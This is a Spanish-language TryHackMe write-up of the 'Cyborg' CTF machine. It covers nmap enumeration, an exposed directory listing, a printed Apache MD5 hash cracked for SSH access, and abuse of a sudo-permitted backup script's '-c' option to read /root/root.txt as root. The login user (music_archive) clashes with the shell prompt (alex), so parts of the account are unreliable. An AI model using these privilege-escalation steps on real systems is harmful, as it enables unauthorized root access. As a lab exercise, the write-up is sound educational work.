# 🎯 TryHackMe Writeup – Cyborg

Este repositorio documenta el proceso completo de resolución de una máquina de **TryHackMe**, desde la enumeración inicial hasta la escalada de privilegios para obtener acceso root.

El objetivo de este writeup es practicar técnicas comunes utilizadas en **pentesting y CTF**, como enumeración de servicios, análisis de archivos expuestos, cracking de hashes y explotación de scripts con permisos elevados.

---

# 🖥️ Información de la máquina

* Plataforma: TryHackMe
* Sistema operativo: Linux
* Dificultad: Easy
* Tipo: Capture The Flag (CTF)

Técnicas utilizadas:

* Enumeración con Nmap
* Directory listing
* Análisis de archivos de backup
* Cracking de hashes
* Acceso por SSH
* Enumeración de privilegios
* Command Injection
* Privilege Escalation

---

# 🔎 Enumeración

El primer paso fue escanear la máquina para identificar servicios activos.

```bash
nmap -sC -sV <IP>
```

Durante la enumeración web se encontró un **directory listing habilitado** en el servidor Apache.

```
Index of /etc
[DIR] squid/
Apache/2.4.18 (Ubuntu) Server
```

Esto permitió explorar archivos que normalmente no deberían ser accesibles públicamente.

---

# 📂 Archivos encontrados

Dentro de los archivos expuestos se encontró un **archivo comprimido con información del sistema**.

Después de descargarlo se observó el siguiente contenido:

```
archive.tar
hash.txt
home/
nmap
```

La estructura del directorio era la siguiente:

```
home
└── field
    └── dev
        └── final_archive
```

---

# 🔐 Hash encontrado

Dentro de los archivos también se encontró el siguiente hash:

```
music_archive:$apr1$BpZ.Q.1m$F0qqPwHSOG50URuOVQTTn.
```

Este es un **hash Apache MD5** que puede ser crackeado con herramientas como:

* John the Ripper
* Hashcat

Una vez crackeado se obtiene la contraseña para el usuario **music_archive**.

---

# 🔑 Acceso SSH

Con las credenciales obtenidas se intentó acceder por SSH.

```bash
ssh music_archive@ip
```

Después de ingresar la contraseña crackeada se logró acceso al sistema.

---

# 📁 Exploración del sistema

Una vez dentro del sistema se revisó el contenido del directorio home del usuario **alex**.

```bash
alex@ubuntu:~$ ls
Desktop  Documents  Downloads  Music  Pictures  Public  Templates  user.txt  Videos
```

Se encontró el archivo **user.txt**, que contiene la primera flag.

Intenté acceder con `cd`, pero no funcionó porque es un archivo.

```bash
alex@ubuntu:~$ cd user.txt
-bash: cd: user.txt: Not a directory
```

La forma correcta fue usar `cat`.

```bash
alex@ubuntu:~$ cat user.txt

```

✅ **User flag obtenida**

---

# 🔍 Enumeración de privilegios

El siguiente paso fue verificar los permisos sudo del usuario.

```bash
sudo -l
```

Salida:

```
User alex may run the following commands on ubuntu:
(ALL : ALL) NOPASSWD: /etc/mp3backups/backup.sh
```

Esto significa que el usuario **alex puede ejecutar el script backup.sh como root sin contraseña**.

---

# 📜 Análisis del script

El script se encuentra en:

```
/etc/mp3backups/backup.sh
```

Al ejecutarlo normalmente:

```bash
sudo /etc/mp3backups/backup.sh
```

El script intenta realizar un backup de archivos `.mp3` dentro del directorio `Music`.

Sin embargo aparecen errores porque los archivos no existen.

```
tar: Cannot stat: No such file or directory
```

---

# ⚡ Vulnerabilidad encontrada

Probando parámetros se descubrió que el script acepta la opción **-c**, la cual permite ejecutar comandos.

Ejemplo:

```bash
sudo /etc/mp3backups/backup.sh -c whoami
```

Resultado:

```
root
```

Esto confirma una **Command Injection**, ya que el script ejecuta comandos directamente como root.

---

# 🚀 Escalada de privilegios

Aprovechando la vulnerabilidad se ejecutó el siguiente comando:

```bash
sudo /etc/mp3backups/backup.sh -c "cat /root/root.txt"
```

Salida:

```
flag{--}
```

✅ **Root flag obtenida**

---

# 🏁 Flags

## User Flag

```
flag{---}
```

## Root Flag

```
flag{--}
```

---

# 🧠 Lecciones aprendidas

Esta máquina demuestra varios conceptos importantes de seguridad:

* La importancia de revisar **directory listing**
* Analizar archivos de backup expuestos
* Cracking de hashes para obtener credenciales
* Revisar permisos con `sudo -l`
* Analizar scripts ejecutables con privilegios elevados
* Identificar **command injection**

Errores como estos son comunes cuando se crean scripts automatizados sin validar correctamente los parámetros de entrada.

---

# 🛠️ Herramientas utilizadas

```
Nmap
SSH
John the Ripper
tar
cat
sudo
```

---

# 📚 Conclusión

Esta máquina es un buen ejemplo de cómo una mala configuración puede comprometer completamente un sistema.

Primero se aprovechó un **directory listing** para obtener archivos sensibles, luego se crackeó un hash para acceder al sistema, y finalmente se explotó un script con permisos sudo para obtener acceso **root**.

Este tipo de vulnerabilidades aparecen con frecuencia en entornos reales cuando los administradores automatizan tareas sin validar correctamente el input de los usuarios.

---

# 👨‍💻 Autor

Juanma Acosta

